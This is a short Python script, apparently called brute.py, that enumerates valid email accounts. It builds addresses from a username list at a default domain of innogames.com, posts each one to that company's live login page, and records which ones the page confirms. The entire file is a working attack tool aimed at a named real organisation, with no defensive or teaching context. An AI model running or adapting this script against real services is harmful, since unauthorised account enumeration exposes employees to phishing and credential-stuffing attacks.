import requests, sys
from bs4 import BeautifulSoup
from time import sleep


def brute(emails):
    found_emails = list()
    for i in range(len(emails)):
        data = {'email': emails[i]}
        r = (requests.post(url=url, data=data)).content
        html = BeautifulSoup(r, 'html.parser')
        found = html.find('p', attrs={"class":"success1 well"})
        if found is not None:
            print("{}\t\tFound".format(emails[i]))
            found_emails.append(emails[i])
        else:
            print("{}\t\tNO".format(emails[i]))

    return list(set(found_emails))

def prepare(usernames, domain):
    return [i.rstrip() + "@" + domain for i in usernames]

def brute_from_username_file(file, save_to, domain="innogames.com"):
    f = open(file, 'r')
    data = f.readlines()
    f.close()
    emails = prepare(data, domain)
    found = brute(emails)
    print(found)
    save(found, save_to)

def read_and_prepare(file, domain="innogames.com"):
    f = open(file, 'r')
    data = f.readlines()
    f.close()
    return prepare(data, domain)

def save(found, save_to):
    with open(save_to, 'a+') as f:
        for i in found:
            f.write("%s\n" % i)


if __name__ == '__main__':
    url = "https://goodbye.innogames.com/login"
    print(len(sys.argv))
    if len(sys.argv) == 1:
        print("Usage: python3 brute.py [file_from file_to [domain]]\n")
        brute_from_username_file("username_list_a", "found_emails")
    elif len(sys.argv) == 3:
        brute_from_username_file(sys.argv[1], sys.argv[2])
    elif len(sys.argv) == 4:
        brute_from_username_file(sys.argv[1], sys.argv[2],domain=sys.argv[3])
    else:
        print("Usage: python3 brute.py file_from file_to domain\n")

